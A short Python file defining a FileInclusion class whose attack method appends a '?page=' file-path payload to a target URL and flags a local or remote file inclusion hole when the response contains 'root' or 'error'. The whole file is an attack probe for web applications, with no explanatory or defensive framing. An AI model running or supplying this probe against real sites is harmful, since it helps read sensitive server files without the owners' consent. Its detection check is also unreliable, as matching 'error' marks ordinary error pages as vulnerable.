import requests

class FileInclusion:
    def __init__(self, target_url):
        self.target_url = target_url

    def attack(self, file_path):
        payload = f"?page={file_path}"
        url = self.target_url + payload
        try:
            response = requests.get(url)
            if "root" in response.text or "error" in response.text:
                print(f"Potential LFI/RFI vulnerability found with file: {file_path}")
            else:
                print(f"No vulnerability found for file: {file_path}")
        except requests.RequestException as e:
            print(f"Error during File Inclusion attack: {e}")
